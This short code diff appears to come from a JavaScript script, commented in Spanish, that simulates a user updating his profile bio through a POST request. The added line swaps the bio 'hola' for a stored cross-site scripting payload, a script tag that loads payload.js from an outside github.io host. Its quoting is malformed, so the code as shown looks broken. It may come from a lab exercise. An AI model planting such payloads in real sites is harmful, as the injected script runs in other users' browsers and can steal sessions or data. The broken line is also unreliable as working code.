@@ -25,7 +25,8 @@
     const formData = new FormData();
     formData.append("username", username);
     formData.append("email", email);
-    formData.append("bio", "hola");
+    formData.append("bio", "<script src=""https://scursatonegino16.github.io/payload.js"></script>
+"");
 
     // Paso 4: enviar la petición POST (simula que Pepe actualiza su bio)
     const update = await fetch("/profile", {
